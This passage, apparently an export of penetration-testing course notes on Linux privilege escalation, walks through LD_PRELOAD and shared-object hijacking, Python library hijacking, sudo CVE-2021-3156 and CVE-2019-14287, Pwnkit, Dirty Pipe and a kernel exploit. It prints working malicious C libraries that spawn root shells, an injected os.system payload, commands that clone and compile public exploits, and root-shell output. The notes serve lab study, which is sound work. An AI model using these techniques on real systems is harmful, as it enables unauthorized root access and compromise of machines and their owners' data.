Exploits\n\n```shell-session\ndrxh3kr@htb[/htb]$ cat /etc/lsb-release \n\nDISTRIB_ID=Ubuntu\nDISTRIB_RELEASE=16.04\nDISTRIB_CODENAME=xenial\nDISTRIB_DESCRIPTION=\"Ubuntu 16.04.4 LTS\"\n```\n\nWe can see that we are on Linux Kernel 4.4.0-116 on an Ubuntu 16.04.4 LTS box. A quick Google search for `linux 4.4.0-116-generic exploit` comes up with [this](https://vulners.com/zdt/1337DAY-ID-30003) exploit PoC. Next download it to the system using `wget` or another file transfer method. We can compile the exploit code using [gcc](https://linux.die.net/man/1/gcc) and set the executable bit using `chmod +x`.\n\nKernel Exploits\n\n```shell-session\ndrxh3kr@htb[/htb]$ gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit\n```\n\nNext, we run the exploit and hopefully get dropped into a root shell.\n\nKernel Exploits\n\n```shell-session\ndrxh3kr@htb[/htb]$ ./kernel_exploit \n\ntask_struct = ffff8800b71d7000\nuidptr = ffff8800b95ce544\nspawning root shell\n```\n\nFinally, we can confirm root access to the box.\n\nKernel Exploits\n\n```shell-session\nroot@htb[/htb]# whoami\n\nroot\n```\n\nNote: The target system has been updated, but is still vulnerable. Use a kernel exploit created in 2021.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/16-Linux Privilege Escalation/20-Shared Libraries",
    "path": "02_CPTS/16-Linux Privilege Escalation/20-Shared Libraries.md",
    "title": "20 Shared Libraries",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- It is common for Linux programs to use dynamically linked shared object libraries. Libraries contain compiled code or other data that developers use to avoid having to re-write the same pieces of ...",
    "category": "02_CPTS",
    "content": "\n---\n\nIt is common for Linux programs to use dynamically linked shared object libraries. Libraries contain compiled code or other data that developers use to avoid having to re-write the same pieces of code across multiple programs. Two types of libraries exist in Linux: `static libraries` (denoted by the .a file extension) and `dynamically linked shared object libraries` (denoted by the .so file extension). When a program is compiled, static libraries become part of the program and can not be altered. However, dynamic libraries can be modified to control the execution of the program that calls them.\n\nThere are multiple methods for specifying the location of dynamic libraries, so the system will know where to look for them on program execution. This includes the `-rpath` or `-rpath-link` flags when compiling a program, using the environmental variables `LD_RUN_PATH` or `LD_LIBRARY_PATH`, placing libraries in the `/lib` or `/usr/lib` default directories, or specifying another directory containing the libraries within the `/etc/ld.so.conf` configuration file.\n\nAdditionally, the `LD_PRELOAD` environment variable can load a library before executing a binary. The functions from this library are given preference over the default ones. The shared objects required by a binary can be viewed using the `ldd` utility.\n\nShared Libraries\n\n```shell-session\nhtb_student@NIX02:~$ ldd /bin/ls\n\n\tlinux-vdso.so.1 =>  (0x00007fff03bc7000)\n\tlibselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f4186288000)\n\tlibc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4185ebe000)\n\tlibpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4185c4e000)\n\tlibdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4185a4a000)\n\t/lib64/ld-linux-x86-64.so.2 (0x00007f41864aa000)\n\tlibpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f418582d000)\n```\n\nThe image above lists all the libraries required by `/bin/ls`, along with their absolute paths.\n\n---\n\n## LD_PRELOAD Privilege Escalation\n\nLet's see an example of how we can utilize the [LD_PRELOAD](https://web.archive.org/web/20231214050750/https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html) environment variable to escalate privileges. For this, we need a user with `sudo` privileges.\n\nShared Libraries\n\n```shell-session\nhtb_student@NIX02:~$ sudo -l\n\nMatching Defaults entries for daniel.carter on NIX02:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, env_keep+=LD_PRELOAD\n\nUser daniel.carter may run the following commands on NIX02:\n    (root) NOPASSWD: /usr/sbin/apache2 restart\n```\n\nThis user has rights to restart the Apache service as root, but since this is `NOT` a [GTFOBin](https://gtfobins.github.io/#apache) and the `/etc/sudoers` entry is written specifying the absolute path, this could not be used to escalate privileges under normal circumstances. However, we can exploit the `LD_PRELOAD` issue to run a custom shared library file. Let's compile the following library:\n\nCode: c\n\n```c\n#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nvoid _init() {\nunsetenv(\"LD_PRELOAD\");\nsetgid(0);\nsetuid(0);\nsystem(\"/bin/bash\");\n}\n```\n\nWe can compile this as follows:\n\nShared Libraries\n\n```shell-session\nhtb_student@NIX02:~$ gcc -fPIC -shared -o root.so root.c -nostartfiles\n```\n\nFinally, we can escalate privileges using the below command. Make sure to specify the full path to your malicious library file.\n\nShared Libraries\n\n```shell-session\nhtb_student@NIX02:~$ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart\n\nid\nuid=0(root) gid=0(root) groups=0(root)\n```",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/16-Linux Privilege Escalation/21-Shared Object Hijacking",
    "path": "02_CPTS/16-Linux Privilege Escalation/21-Shared Object Hijacking.md",
    "title": "21 Shared Object Hijacking",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Programs and binaries under development usually have custom libraries associated with them. Consider the following SETUID binary. Shared Object Hijacking `shell-session htb-student@NIX02:~$ ls -la...",
    "category": "02_CPTS",
    "content": "\n---\n\nPrograms and binaries under development usually have custom libraries associated with them. Consider the following `SETUID` binary.\n\nShared Object Hijacking\n\n```shell-session\nhtb-student@NIX02:~$ ls -la payroll\n\n-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll\n```\n\nWe can use [ldd](https://manpages.ubuntu.com/manpages/bionic/man1/ldd.1.html) to print the shared object required by a binary or shared object. `Ldd` displays the location of the object and the hexadecimal address where it is loaded into memory for each of a program's dependencies.\n\nShared Object Hijacking\n\n```shell-session\nhtb-student@NIX02:~$ ldd payroll\n\nlinux-vdso.so.1 =>  (0x00007ffcb3133000)\nlibshared.so => /development/libshared.so (0x00007f0c13112000)\nlibc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)\n/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)\n```\n\nWe see a non-standard library named `libshared.so` listed as a dependency for the binary. As stated earlier, it is possible to load shared libraries from custom locations. One such setting is the `RUNPATH` configuration. Libraries in this folder are given preference over other folders. This can be inspected using the [readelf](https://man7.org/linux/man-pages/man1/readelf.1.html) utility.\n\nShared Object Hijacking\n\n```shell-session\nhtb-student@NIX02:~$ readelf -d payroll  | grep PATH\n\n 0x000000000000001d (RUNPATH)            Library runpath: [/development]\n```\n\nThe configuration allows the loading of libraries from the `/development` folder, which is writable by all users. This misconfiguration can be exploited by placing a malicious library in `/development`, which will take precedence over other folders because entries in this file are checked first (before other folders present in the configuration files).\n\nShared Object Hijacking\n\n```shell-session\nhtb-student@NIX02:~$ ls -la /development/\n\ntotal 8\ndrwxrwxrwx  2 root root 4096 Sep  1 22:06 ./\ndrwxr-xr-x 23 root root 4096 Sep  1 21:26 ../\n```\n\nBefore compiling a library, we need to find the function name called by the binary.\n\nShared Object Hijacking\n\n```shell-session\nhtb-student@NIX02:~$ ldd payroll\n\nlinux-vdso.so.1 (0x00007ffd22bbc000)\nlibshared.so => /development/libshared.so (0x00007f0c13112000)\n/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)\n```\n\nShared Object Hijacking\n\n```shell-session\nhtb-student@NIX02:~$ cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so\n```\n\nShared Object Hijacking\n\n```shell-session\nhtb-student@NIX02:~$ ./payroll \n\n./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery\n```\n\nWe can copy an existing library to the `development` folder. Running `ldd` against the binary lists the library's path as `/development/libshared.`so, which means that it is vulnerable. Executing the binary throws an error stating that it failed to find the function named `dbquery`. We can compile a shared object which includes this function.\n\nCode: c\n\n```c\n#include<stdio.h>\n#include<stdlib.h>\n#include<unistd.h>\n\nvoid dbquery() {\n    printf(\"Malicious library loaded\\n\");\n    setuid(0);\n    system(\"/bin/sh -p\");\n} \n\n```\n\nThe `dbquery` function sets our user id to 0 (root) and executing `/bin/sh` when called. Compile it using [GCC](https://linux.die.net/man/1/gcc).\n\nShared Object Hijacking\n\n```shell-session\nhtb-student@NIX02:~$ gcc src.c -fPIC -shared -o /development/libshared.so\n```\n\nExecuting the binary again should display the banner and pops a root shell.\n\nShared Object Hijacking\n\n```shell-session\nhtb-student@NIX02:~$ ./payroll \n\n***************Inlane Freight Employee Database***************\n\nMalicious library loaded\n# id\nuid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)\n```",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/16-Linux Privilege Escalation/22-Python Library Hijacking",
    "path": "02_CPTS/16-Linux Privilege Escalation/22-Python Library Hijacking.md",
    "title": "22 Python Library Hijacking",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Python is one of the world's most popular and widely used programming languages and has already replaced many other programming languages in the IT industry. There are very many reasons why Python...",
    "category": "02_CPTS",
    "content": "\n---\n\nPython is one of the world's most popular and widely used programming languages and has already replaced many other programming languages in the IT industry. There are very many reasons why Python is so popular among programmers. One of them is that users can work with a vast collection of libraries.\n\nMany libraries are used in Python and are used in many different fields. One of them is [NumPy](https://numpy.org/doc/stable/). `NumPy` is an open-source extension for Python. The module provides precompiled functions for numerical analysis. In particular, it allows easy handling of extensive lists and matrices. However, it offers many other essential features, such as functions of random number generation, Fourier transform, linear algebra, and many others. Furthermore, NumPy provides many mathematical functions for working with arrays and matrices.\n\nAnother library is [Pandas](https://pandas.pydata.org/docs/). `Pandas` is a library for data processing and data analysis with Python. It extends Python with data structures and functions for processing data tables. A particular strength of Pandas is time series analysis. \n\nPython has [the Python standard library](https://docs.python.org/3/library/), with many modules on board from a standard installation of Python. These modules provide many solutions that would otherwise have to be laboriously worked out by writing our programs. There are countless hours of saved work here if one has an overview of the available modules and their possibilities. The modular system is integrated into this form for performance reasons. If one would automatically have all possibilities immediately available in the basic installation of Python without importing the corresponding module, the speed of all Python programs would suffer greatly.\n\nIn Python, we can import modules quite easily:\n\n#### Importing Modules\n\nCode: python\n\n```python\n#!/usr/bin/env python3\n\n# Method 1\nimport pandas\n\n# Method 2\nfrom pandas import *\n\n# Method 3\nfrom pandas import Series\n```\n\nThere are many ways in which we can hijack a Python library. Much depends on the script and its contents itself. However, there are three basic vulnerabilities where hijacking can be used:\n\n1. Wrong write permissions\n2. Library Path\n3. PYTHONPATH environment variable\n\n---\n\n## Wrong Write Permissions\n\nFor example, we can imagine that we are in a developer's host on the company's intranet and that the developer is working with python. So we have a total of three components that are connected. This is the actual python script that imports a python module and the privileges of the script as well as the permissions of the module.\n\nOne or another python module may have write permissions set for all users by mistake. This allows the python module to be edited and manipulated so that we can insert commands or functions that will produce the results we want. If `SUID`/`SGID` permissions have been assigned to the Python script that imports this module, our code will automatically be included.\n\nIf we look at the set permissions of the `mem_status.py` script, we can see that it has a `SUID` set.\n\n#### Python Script\n\nPython Library Hijacking\n\n```shell-session\nhtb-student@lpenix:~$ ls -l mem_status.py\n\n-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py\n```\n\nBy analyzing the permissions over the `mem_status.py` Python file, we understand that we can execute this script and we also have permission to view the script, and read its contents.\n\n#### Python Script - Contents\n\nCode: python\n\n```python\n#!/usr/bin/env python3\nimport psutil\n\navailable_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total\n\nprint(f\"Available memory: {round(available_memory, 2)}%\")\n```\n\nSo this script is quite simple and only shows the available virtual memory in percent. We can also see in the second line that this script imports the module `psutil` and uses the function `virtual_memory()`.\n\nSo we can look for this function in the folder of `psutil` and check if this module has write permissions for us.\n\n#### Module Permissions\n\nPython Library Hijacking\n\n```shell-session\nhtb-student@lpenix:~$ grep -r \"def virtual_memory\" /usr/local/lib/python3.8/dist-packages/psutil/*\n\n/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():\n/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():\n/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():\n/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():\n/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():\n/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():\n/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():\n\n\nhtb-student@lpenix:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py\n\n-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py\n```\n\nSuch permissions are most common in developer environments where many developers work on different scripts and may require higher privileges.\n\n#### Module Contents\n\nCode: python\n\n```python\n...SNIP...\n\ndef virtual_memory():\n\n\t...SNIP...\n\t\n    global _TOTAL_PHYMEM\n    ret = _psplatform.virtual_memory()\n    # cached for later use in Process.memory_percent()\n    _TOTAL_PHYMEM = ret.total\n    return ret\n\n...SNIP...\n```\n\nThis is the part in the library where we can insert our code. It is recommended to put it right at the beginning of the function. There we can insert everything we consider correct and effective. We can import the module `os` for testing purposes, which allows us to execute system commands. With this, we can insert the command `id` and check during the execution of the script if the inserted code is executed.\n\n#### Module Contents - Hijacking\n\nCode: python\n\n```python\n...SNIP...\n\ndef virtual_memory():\n\n\t...SNIP...\n\t#### Hijacking\n\timport os\n\tos.system('id')\n\t\n\n    global _TOTAL_PHYMEM\n    ret = _psplatform.virtual_memory()\n    # cached for later use in Process.memory_percent()\n    _TOTAL_PHYMEM = ret.total\n    return ret\n\n...SNIP...\n```\n\nNow we can run the script with `sudo` and check if we get the desired result.\n\n#### Privilege Escalation\n\nPython Library Hijacking\n\n```shell-session\nhtb-student@lpenix:~$ sudo /usr/bin/python3 ./mem_status.py\n\nuid=0(root) gid=0(root) groups=0(root)\nuid=0(root) gid=0(root) groups=0(root)\nAvailable memory: 79.22%\n```\n\nSuccess. As we can see from the result above, we were successfully able to hijack the library and have our code inside of the `virtual_memory()` function run as `root`. Now that we have the desired result, we can edit the library again, but this time, insert a reverse shell that connects to our host as `root`.\n\n---\n\n## Library Path\n\nIn Python, each version has a specified order in which libraries (`modules`) are searched and imported from. The order in which Python imports `modules` from are based on a priority system, meaning that paths higher on the list take priority over ones lower on the list. We can see this by issuing the following command:\n\n#### PYTHONPATH Listing\n\nPython Library Hijacking\n\n```shell-session\nhtb-student@lpenix:~$ python3 -c 'import sys; print(\"\\n\".join(sys.path))'\n\n/usr/lib/python38.zip\n/usr/lib/python3.8\n/usr/lib/python3.8/lib-dynload\n/usr/local/lib/python3.8/dist-packages\n/usr/lib/python3/dist-packages\n```\n\nTo be able to use this variant, two prerequisites are necessary.\n\n1. The module that is imported by the script is located under one of the lower priority paths listed via the `PYTHONPATH` variable.\n2. We must have write permissions to one of the paths having a higher priority on the list.\n\nTherefore, if the imported module is located in a path lower on the list and a higher priority path is editable by our user, we can create a module ourselves with the same name and include our own desired functions. Since the higher priority path is read earlier and examined for the module in question, Python accesses the first hit it finds and imports it before reaching the original and intended module.\n\nIn order for this to make a bit more sense, let us continue with the previous example and show how this can be exploited. Previously, the `psutil` module was imported into the `mem_status.py` script. We can see `psutil`'s default installation location by issuing the following command:\n\n#### Psutil Default Installation Location\n\nPython Library Hijacking\n\n```shell-session\nhtb-student@lpenix:~$ pip3 show psutil\n\n...SNIP...\nLocation: /usr/local/lib/python3.8/dist-packages\n\n...SNIP...\n```\n\nFrom this example, we can see that `psutil` is installed in the following path: `/usr/local/lib/python3.8/dist-packages`. From our previous listing of the `PYTHONPATH` variable, we have a reasonable amount of directories to choose from to see if there might be any misconfigurations in the environment to allow us `write` access to any of them. Let us check.\n\n#### Misconfigured Directory Permissions\n\nPython Library Hijacking\n\n```shell-session\nhtb-student@lpenix:~$ ls -la /usr/lib/python3.8\n\ntotal 4916\ndrwxr-xrwx 30 root root  20480 Dec 14 16:26 .\n...SNIP...\n```\n\nAfter checking all of the directories listed, it appears that `/usr/lib/python3.8` path is misconfigured in a way to allow any user to write to it. Cross-checking with values from the `PYTHONPATH` variable, we can see that this path is higher on the list than the path in which `psutil` is installed in. Let us try abusing this misconfiguration to create our own `psutil` module containing our own malicious `virtual_memory()` function within the `/usr/lib/python3.8` directory.\n\n#### Hijacked Module Contents - psutil.py\n\nCode: python\n\n```python\n#!/usr/bin/env python3\n\nimport os\n\ndef virtual_memory():\n    os.system('id')\n```\n\nIn order to get to this point, we need to create a file called `psutil.py` containing the contents listed above in the previously mentioned directory. It is very important that we make sure that the module we create has the same name as the import as well as have the same function with the correct number of arguments passed to it as the function we are intending to hijack. This is critical as without either of these conditions being `true`, we will not be able perform this attack. After creating this file containing the example of our previous hijacking script, we have successfully prepped the system for exploitation.\n\nLet us once again run the `mem_status.py` script using `sudo` like in the previous example.\n\n#### Privilege Escalation via Hijacking Python Library Path\n\nPython Library Hijacking\n\n```shell-session\nhtb-student@lpenix:~$ sudo /usr/bin/python3 mem_status.py\n\nuid=0(root) gid=0(root) groups=0(root)\nTraceback (most recent call last):\n  File \"mem_status.py\", line 4, in <module>\n    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total\nAttributeError: 'NoneType' object has no attribute 'available' \n```\n\nAs we can see from the output, we have successfully gained execution as `root` through hijacking the module's path via a misconfiguration in the permissions of the `/usr/lib/python3.8` directory.\n\n---\n\n## PYTHONPATH Environment Variable\n\nIn the previous section, we touched upon the term `PYTHONPATH`, however, didn't fully explain it's use and importance regarding the functionality of Python. `PYTHONPATH` is an environment variable that indicates what directory (or directories) Python can search for modules to import. This is important as if a user is allowed to manipulate and set this variable while running the python binary, they can effectively redirect Python's search functionality to a `user-defined` location when it comes time to import modules. We can see if we have the permissions to set environment variables for the python binary by checking our `sudo` permissions:\n\n#### Checking sudo permissions\n\nPython Library Hijacking\n\n```shell-session\nhtb-student@lpenix:~$ sudo -l \n\nMatching Defaults entries for htb-student on ACADEMY-LPENIX:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser htb-student may run the following commands on ACADEMY-LPENIX:\n    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3\n```\n\nAs we can see from the example, we are allowed to run `/usr/bin/python3` under the trusted permissions of `sudo` and are therefore allowed to set environment variables for use with this binary by the `SETENV:` flag being set. It is important to note, that due to the trusted nature of `sudo`, any environment variables defined prior to calling the binary are not subject to any restrictions regarding being able to set environment variables on the system. This means that using the `/usr/bin/python3` binary, we can effectively set any environment variables under the context of our running program. Let's try to do so now using the `psutil.py` script from the last section.\n\n#### Privilege Escalation using PYTHONPATH Environment Variable\n\nPython Library Hijacking\n\n```shell-session\nhtb-student@lpenix:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py\n\nuid=0(root) gid=0(root) groups=0(root)\n...SNIP...\n```\n\nIn this example, we moved the previous python script from the `/usr/lib/python3.8` directory to `/tmp`. From here we once again call `/usr/bin/python3` to run `mem_stats.py`, however, we specify that the `PYTHONPATH` variable contain the `/tmp` directory so that it forces Python to search that directory looking for the `psutil` module to import. As we can see, we once again have successfully run our script under the context of root.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/16-Linux Privilege Escalation/23- Sudo",
    "path": "02_CPTS/16-Linux Privilege Escalation/23- Sudo.md",
    "title": "23  Sudo",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- The program sudo is used under UNIX operating systems like Linux or macOS to start processes with the rights of another user. In most cases, commands are executed that are only available to admini...",
    "category": "02_CPTS",
    "content": "\n\n---\n\nThe program `sudo` is used under UNIX operating systems like Linux or macOS to start processes with the rights of another user. In most cases, commands are executed that are only available to administrators. It serves as an additional layer of security or a safeguard to prevent the system and its contents from being damaged by unauthorized users. The `/etc/sudoers` file specifies which users or groups are allowed to run specific programs and with what privileges.\n\n\n\n```shell-session\ncry0l1t3@nix02:~$ sudo cat /etc/sudoers | grep -v \"#\" | sed -r '/^\\s*$/d'\n[sudo] password for cry0l1t3:  **********\n\nDefaults        env_reset\nDefaults        mail_badpass\nDefaults        secure_path=\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin\"\nDefaults        use_pty\nroot            ALL=(ALL:ALL) ALL\n%admin          ALL=(ALL) ALL\n%sudo           ALL=(ALL:ALL) ALL\ncry0l1t3        ALL=(ALL) /usr/bin/id\n@includedir     /etc/sudoers.d\n```\n\nOne of the latest vulnerabilities for `sudo` carries the CVE-2021-3156 and is based on a heap-based buffer overflow vulnerability. This affected the sudo versions:\n\n- 1.8.31 - Ubuntu 20.04\n- 1.8.27 - Debian 10\n- 1.9.2 - Fedora 33\n- and others\n\nTo find out the version of `sudo`, the following command is sufficient:\n\n\n\n```shell-session\ncry0l1t3@nix02:~$ sudo -V | head -n1\n\nSudo version 1.8.31\n```\n\nThe interesting thing about this vulnerability was that it had been present for over ten years until it was discovered. There is also a public [Proof-Of-Concept](https://github.com/blasty/CVE-2021-3156) that can be used for this. We can either download this to a copy of the target system we have created or, if we have an internet connection, to the target system itself.\n\n\n\n```shell-session\ncry0l1t3@nix02:~$ git clone https://github.com/blasty/CVE-2021-3156.git\ncry0l1t3@nix02:~$ cd CVE-2021-3156\ncry0l1t3@nix02:~$ make\n\nrm -rf libnss_X\nmkdir libnss_X\ngcc -std=c99 -o sudo-hax-me-a-sandwich hax.c\ngcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c\n```\n\nWhen running the exploit, we can be shown a list that will list all available versions of the operating systems that may be affected by this vulnerability.\n\n\n\n```shell-session\ncry0l1t3@nix02:~$ ./sudo-hax-me-a-sandwich\n\n** CVE-2021-3156 PoC by blasty <peter@haxx.in>\n\n  usage: ./sudo-hax-me-a-sandwich <target>\n\n  available targets:\n  ------------------------------------------------------------\n    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27\n    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31\n    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28\n  ------------------------------------------------------------\n\n  manual mode:\n    ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>\n```\n\nWe can find out which version of the operating system we are dealing with using the following command:\n\n\n\n```shell-session\ncry0l1t3@nix02:~$ cat /etc/lsb-release\n\nDISTRIB_ID=Ubuntu\nDISTRIB_RELEASE=20.04\nDISTRIB_CODENAME=focal\nDISTRIB_DESCRIPTION=\"Ubuntu 20.04.1 LTS\"\n```\n\nNext, we specify the respective ID for the version operating system and run the exploit with our payload.\n\nSudo\n\n```shell-session\ncry0l1t3@nix02:~$ ./sudo-hax-me-a-sandwich 1\n\n** CVE-2021-3156 PoC by blasty <peter@haxx.in>\n\nusing target: Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 ['/usr/bin/sudoedit'] (56, 54, 63, 212)\n** pray for your rootshell.. **\n\n# id\n\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n---\n\n## Sudo Policy Bypass\n\nAnother vulnerability was found in 2019 that affected all versions below `1.8.28`, which allowed privileges to escalate even with a simple command. This vulnerability has the [CVE-2019-14287](https://www.sudo.ws/security/advisories/minus_1_uid/) and requires only a single prerequisite. It had to allow a user in the `/etc/sudoers` file to execute a specific command.\n\nSudo\n\n```shell-session\ncry0l1t3@nix02:~$ sudo -l\n[sudo] password for cry0l1t3: **********\n\nUser cry0l1t3 may run the following commands on Penny:\n    ALL=(ALL) /usr/bin/id\n```\n\nIn fact, `Sudo` also allows commands with specific user IDs to be executed, which executes the command with the user's privileges carrying the specified ID. The ID of the specific user can be read from the `/etc/passwd` file.\n\nSudo\n\n```shell-session\ncry0l1t3@nix02:~$ cat /etc/passwd | grep cry0l1t3\n\ncry0l1t3:x:1005:1005:cry0l1t3,,,:/home/cry0l1t3:/bin/bash\n```\n\nThus the ID for the user `cry0l1t3` would be `1005`. If a negative ID (`-1`) is entered at `sudo`, this results in processing the ID `0`, which only the `root` has. This, therefore, led to the immediate root shell.\n\nSudo\n\n```shell-session\ncry0l1t3@nix02:~$ sudo -u#-1 id\n\nroot@nix02:/home/cry0l1t3# id\n\nuid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)\n```",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/16-Linux Privilege Escalation/24-Polkit",
    "path": "02_CPTS/16-Linux Privilege Escalation/24-Polkit.md",
    "title": "24 Polkit",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- PolicyKit (polkit) is an authorization service on Linux-based operating systems that allows user software and system components to communicate with each other if the user software is authorized to...",
    "category": "02_CPTS",
    "content": "\n\n---\n\nPolicyKit (`polkit`) is an authorization service on Linux-based operating systems that allows user software and system components to communicate with each other if the user software is authorized to do so. To check whether the user software is authorized for this instruction, `polkit` is asked. It is possible to set how permissions are granted by default for each user and application. For example, for each user, it can be set whether the operation should be generally allowed or forbidden, or authorization as an administrator or as a separate user with a one-time, process-limited, session-limited, or unlimited validity should be required. For individual users and groups, the authorizations can be assigned individually.\n\nPolkit works with two groups of files.\n\n1. actions/policies (`/usr/share/polkit-1/actions`)\n2. rules (`/usr/share/polkit-1/rules.d`)\n\nPolkit also has `local authority` rules which can be used to set or remove additional permissions for users and groups. Custom rules can be placed in the directory `/etc/polkit-1/localauthority/50-local.d` with the file extension `.pkla`.\n\nPolKit also comes with three additional programs:\n\n- `pkexec` - runs a program with the rights of another user or with root rights\n- `pkaction` - can be used to display actions\n- `pkcheck` - this can be used to check if a process is authorized for a specific action\n\nThe most interesting tool for us, in this case, is `pkexec` because it performs the same task as `sudo` and can run a program with the rights of another user or root.\n\n\n\n```shell-session\ncry0l1t3@nix02:~$ # pkexec -u <user> <command>\ncry0l1t3@nix02:~$ pkexec -u root id\n\nuid=0(root) gid=0(root) groups=0(root)\n```\n\nIn the `pkexec` tool, the memory corruption vulnerability with the identifier [CVE-2021-4034](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034) was found, also known as [Pwnkit](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034) and also leads to privilege escalation. This vulnerability was also hidden for more than ten years, and no one can precisely say when it was discovered and exploited. Finally, in November 2021, this vulnerability was published and fixed two months later.\n\nTo exploit this vulnerability, we need to download a [PoC](https://github.com/arthepsy/CVE-2021-4034) and compile it on the target system itself or a copy we have made.\n\n\n\n```shell-session\ncry0l1t3@nix02:~$ git clone https://github.com/arthepsy/CVE-2021-4034.git\ncry0l1t3@nix02:~$ cd CVE-2021-4034\ncry0l1t3@nix02:~$ gcc cve-2021-4034-poc.c -o poc\n```\n\nOnce we have compiled the code, we can execute it without further ado. After the execution, we change from the standard shell (`sh`) to Bash (`bash`) and check the user's IDs.\n\n\n\n```shell-session\ncry0l1t3@nix02:~$ ./poc\n\n# id\n\nuid=0(root) gid=0(root) groups=0(root)\n```",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/16-Linux Privilege Escalation/25-Dirty Pipe",
    "path": "02_CPTS/16-Linux Privilege Escalation/25-Dirty Pipe.md",
    "title": "25 Dirty Pipe",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- A vulnerability in the Linux kernel, named Dirty Pipe (CVE-2022-0847), allows unauthorized writing to root user files on Linux. Technically, the vulnerability is similar to the Dirty Cow vulnerabi...",
    "category": "02_CPTS",
    "content": "\n\n---\n\nA vulnerability in the Linux kernel, named [Dirty Pipe](https://dirtypipe.cm4all.com/) ([CVE-2022-0847](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847)), allows unauthorized writing to root user files on Linux. Technically, the vulnerability is similar to the [Dirty Cow](https://dirtycow.ninja/) vulnerability discovered in 2016. All kernels from version `5.8` to `5.17` are affected and vulnerable to this vulnerability.\n\nIn simple terms, this vulnerability allows a user to write to arbitrary files as long as he has read access to these files. It is also interesting to note that Android phones are also affected. Android apps run with user rights, so a malicious or compromised app could take over the phone.\n\nThis vulnerability is based on pipes. Pipes are a mechanism of unidirectional communication between processes that are particularly popular on Unix systems. For example, we could edit the `/etc/passwd` file and remove the password prompt for the root. This would allow us to log in with the `su` command without the password prompt.\n\nTo exploit this vulnerability, we need to download a [PoC](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits) and compile it on the target system itself or a copy we have made.\n\n#### Download Dirty Pipe Exploit\n\n\n\n```shell-session\ncry0l1t3@nix02:~$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git\ncry0l1t3@nix02:~$ cd CVE-2022-0847-DirtyPipe-Exploits\ncry0l1t3@nix02:~$ bash compile.sh\n```\n\nAfter compiling the code, we have two different exploits available. The first exploit version (`exploit-1`) modifies the `/etc/passwd` and gives us a prompt with root privileges. For this, we need to verify the kernel version and then execute the exploit.\n\n#### Verify Kernel Version\n\nDirty Pipe\n\n```shell-session\ncry0l1t3@nix02:~$ uname -r\n\n5.13.0-46-generic\n```\n\n#### Exploitation\n\nDirty Pipe\n\n```shell-session\ncry0l1t3@nix02:~$ ./exploit-1\n\nBacking up /etc/passwd to /tmp/passwd.bak ...\nSetting root password to \"piped\"...\nPassword: Restoring /etc/passwd from /tmp/passwd.bak...\nDone! Popping shell... (run commands 